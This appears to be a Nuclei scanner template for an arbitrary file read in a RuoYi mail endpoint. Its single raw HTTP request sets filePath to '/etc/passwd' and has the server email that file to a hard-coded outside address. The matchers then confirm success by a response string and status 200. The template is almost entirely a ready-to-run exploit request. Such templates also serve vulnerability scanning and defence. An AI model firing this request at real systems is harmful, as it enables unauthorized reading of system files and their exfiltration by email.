id: ruoyi-sendMessageWithAttachment-ReadAnyFile

info:
  name: ruoyi-sendMessageWithAttachment-ReadAnyFile
  author: iSee857
  severity: high
  description: |
    ruoyi-sendMessageWithAttachment-ReadAnyFile

variables:
  email: "odajdueeav@gmail"

http:
  - raw:
      - |
        GET /demo/mail/sendMessageWithAttachment?to={{email}}&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "操作成功"
          - "200"
        condition: and

      - type: status
        status:
          - 200